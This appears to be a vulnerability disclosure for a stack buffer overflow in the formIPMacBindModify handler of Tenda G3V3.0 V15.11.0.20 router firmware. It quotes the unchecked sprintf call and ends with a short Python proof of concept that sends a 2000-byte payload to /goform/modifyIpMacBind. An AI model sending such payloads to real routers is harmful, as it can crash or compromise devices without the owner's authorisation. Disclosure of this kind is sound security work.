## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3369.html

## Affected version

G3V3.0 V15.11.0.20

## Vulnerability details

The Tenda G3V3.0 V15.11.0.20 firmware has a stack overflow vulnerability in the `formIPMacBindModify` function. The `ruleIndex, ip, mac, remark` variable receives the `IPMacBindRuleId, IPMacBindRuleIp, IPMacBindRuleMac, IPMacBindRuleRemark` parameter from a POST request. However, since the user can control the input of `IPMacBindRuleId, IPMacBindRuleIp, IPMacBindRuleMac, IPMacBindRuleRemark `, the statement

```c
sprintf(
    (char *)tmp,
    "%s;1;%s;%s;name%d;%s",
    (const char *)ruleId,
    (const char *)ip,
    (const char *)mac,
    v6,
    (const char *)remark);
```

can cause a buffer overflow. The user-provided `IPMacBindRuleId, IPMacBindRuleIp, IPMacBindRuleMac, IPMacBindRuleRemark` can exceed the capacity of the `tmp` array, triggering this security vulnerability.

![image-20240417104536386](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417104536386.png)

![image-20240417104524808](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417104524808.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/modifyIpMacBind"
payload = b"a"*2000

data = {
    	'IPMacBindRuleIp':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```
